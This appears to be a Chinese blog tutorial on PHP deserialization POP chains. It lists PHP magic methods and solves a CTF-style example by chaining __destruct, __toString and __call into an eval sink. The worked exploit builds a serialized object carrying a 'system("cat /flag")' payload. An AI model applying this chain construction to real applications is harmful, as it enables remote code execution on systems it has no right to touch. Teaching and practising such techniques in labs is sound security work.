---
title: '快速入门web-反序列化-POP 链'
categories:
  - 
tags: []
abbrlink: 3b5621a4
date: 2026-03-08 14:56:37
---
# 快速入门web-反序列化-POP 链

## 知识点：

### 1.魔术方法：

__construct()    //用于在创建对象时自动触发当使用 new 关键字实例化一个类时，会自动调用该类的 __construct() 方法
__destruct()     //__destruct() 用于在对象被销毁时自动触发对象的销毁对象的引用计数减少为零来触发
__sleep()        //序列化serialize() 函数会检查类中是否存在一个魔术方法sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组
__wakeup()       //用于在反序列化对象时自动调用unserialize() 会检查是否存在一个 wakeup() 方法，如果存在，则会先调用wakeup()方法
__tostring()     //__tostring() 在对象被当做字符串处理时自动调用比如echo、==、preg_match()
__invoke()       //__invoke() 在对象被当做函数处理时自动调用
__call()         //__call($method, $args) 在调用一个不存在的方法时触发, $args是数组的形式
__callStatic()   //__callStatic() 在静态调用或调用成员常量时使用的方法不存在时触发
__set()          //__set() 在给不存在的成员属性赋值时触发
__isset()        //__isset() 在对不可访问属性使用 isset() 或empty() 时会被触发
__unset()        //__unset() 在对不可访问属性使用 unset() 时会被触发
__clone()        //__clone() 当使用 clone 关键字拷贝完成一个对象后就会触发 
__get()          //__get() 当尝试访问不可访问属性时会被自动调用





例题1：

```
class step0ne{
public $Manbo;
public $Omogeli;
public function __destruct(){
echo $this->Manbo;
}
}
class steptw0{
public $zabuzabu;
public $yedayeda;
public function __tostring(){
$this->zabuzabu->manbo();
}

}
class stepthr33{
public $hajimi;
public $amiluosi;
public function __call($method, $args){
eval($this->hajimi);
}
}
```

## 解：

*方法：找到出口以及入口，利用链条串起来*

### 1.出口：

看到eval，我们就知道33是出口，怎么才能触发call，需要一个不存在的函数

而且我们需要：

33->Hajimi=’system(“cat /flag”);’

### 2.入口：

0ne存在一个echo，echo的处理逻辑不就是把东西弄成字符串吗，

那我们echo里面要放啥

One->manbo=….

### 3.链条：

two里面有tostring刚好可以和echo搭配。

当two被放在echo里面当成字符串时，触发了tostring，我们就把入口串起来了，

One->Manbo=new two

然后two的zabuzabu就指向了manbo()，此时调用了manbo()函数，



如果manbo()刚好可以是实例33里面的不存在的函数，我们就把出口串起来了,

让zabuzabu是33实例，那么我们就用了this->zabuzabu->manbo()，让33有了一个不存在的manbo()

Two->zabuzabu=new 33



于是得到链条：

```
One->Manbo=new two
Two->zabuzabu=new 33
33->Hajimi=’system(“cat /flag”);’
```

构造

```
$obj = new step0ne;

$obj->Manbo = new steptw0();
$obj->Manbo->zabuzabu = new stepthr33;
$obj->Manbo->zabuzabu->Hajimi='system("cat /flag");';   #必须加外层引号，表示是个字符串；因为eval处理字符

echo serialize($obj);
```

